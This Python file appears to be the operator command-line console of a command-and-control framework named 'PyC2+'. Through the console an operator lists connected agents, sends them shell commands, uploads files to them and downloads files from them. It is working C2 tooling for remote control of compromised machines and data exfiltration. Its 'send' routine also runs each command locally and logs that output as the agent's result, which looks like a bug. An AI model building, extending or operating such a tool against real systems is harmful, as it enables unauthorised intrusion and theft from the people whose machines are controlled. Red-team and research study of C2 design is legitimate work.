import time
import os
import json
from lib.config import agents, tasks, results, AGENT_TIMEOUT
from lib.routes import timestamp, save_file, auth_check
from subprocess import Popen, PIPE
import base64
import threading

def run_local(cmd):
    try:
        p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, text=True)
        out, err = p.communicate()
        return (out + err).strip()
    except Exception as e:
        return f"Error executing command: {e}"

def start_cli():
    time.sleep(1)

    print("\n" + "="*50)
    print("                 PyC2+ CLI")
    print("="*50)
    print("Type 'help' for commands or 'exit' to quit.\n")

    selected = None
    last_seen_index = 0

    def get_prompt():
        if selected:
            return f"\n[PyC2+ | {selected}]> "
        return "\n[PyC2+]> "

    while True:
        try:
            cmd = input(get_prompt()).strip()
        except (KeyboardInterrupt, EOFError):
            print("\nExiting PyC2+ CLI...")
            break

        if not cmd:
            continue

        if cmd.lower() == "help":
            print("\nAvailable commands:")
            print("  agents                   - list all agents")
            print("  select <id>              - select an agent")
            print("  send <command>           - send shell command")
            print("  put <local> <remote>     - upload file to agent")
            print("  get <remote_path>        - download file from agent")
            print("  history                  - show stored results")
            print("  watch                    - live-feed incoming results")
            print("  exit                     - quit CLI (server keeps running)\n")
            continue

        if cmd.lower() == "agents":
            live_agents = [
                agent_id for agent_id, info in agents.items()
                if time.time() - info["last_seen"] <= AGENT_TIMEOUT
            ]
            if not live_agents:
                print("No agents connected.")
            else:
                print("\nConnected agents:")
                for a in live_agents:
                    print(f"  {a}")
            continue

        if cmd.startswith("select "):
            agent_id = cmd.split(" ")[1]
            if agent_id in agents and (time.time() - agents[agent_id]["last_seen"] <= AGENT_TIMEOUT):
                selected = agent_id
                last_seen_index = 0
                print(f"Selected agent: {selected}")
            else:
                print("Invalid or offline agent ID.")
            continue

        # PUT FILE
        if cmd.startswith("put "):
            if not selected:
                print("Select an agent first.")
                continue
            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
                print("Selected agent is offline.")
                continue

            parts = cmd.split(" ")
            if len(parts) < 3:
                print("Usage: put <local_path> <remote_filename>")
                continue

            local, remote = parts[1], parts[2]
            if not os.path.isfile(local):
                print("Local file not found.")
                continue

            with open(local, "rb") as f:
                b64 = base64.b64encode(f.read()).decode()

            payload = json.dumps({"type": "put", "filename": remote, "data": b64})
            tasks[selected].put(payload)
            print(f"Uploaded {local} → {remote} (queued for agent)")
            continue

        # GET FILE
        if cmd.startswith("get "):
            if not selected:
                print("Select an agent first.")
                continue
            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
                print("Selected agent is offline.")
                continue

            remote_path = cmd[len("get "):]
            payload = json.dumps({"type": "get", "path": remote_path})
            tasks[selected].put(payload)
            print(f"Requested file: {remote_path}")
            continue

        # SEND COMMAND
        if cmd.startswith("send "):
            if not selected:
                print("Select an agent first.")
                continue
            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
                print("Selected agent is offline.")
                continue

            command = cmd[len("send "):]
            tasks[selected].put(command)
            output = run_local(command)
            print(output)
            results[selected].append({"timestamp": timestamp(), "result": output})
            continue

        # HISTORY
        if cmd.lower() == "history":
            if not selected:
                print("No agent selected.")
                continue
            for entry in results[selected]:
                print(f"\n[{entry['timestamp']}]")
                print(entry["result"])
            continue

        # WATCH
        if cmd.lower() == "watch":
            if not selected:
                print("No agent selected.")
                continue
            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
                print("Selected agent is offline.")
                continue

            print(f"\n--- LIVE RESULT FEED ({selected}) ---\n")
            while True:
                current_results = results[selected]
                for entry in current_results[last_seen_index:]:
                    print(f"\n[{entry['timestamp']}]")
                    print(entry["result"])
                last_seen_index = len(current_results)
                time.sleep(0.5)
                if threading.main_thread().is_alive() is False:
                    break
            continue

        # EXIT
        if cmd.lower() == "exit":
            print("Leaving CLI. Server still running...")
            break

        print("Unknown command. Type 'help' for a list of commands.")
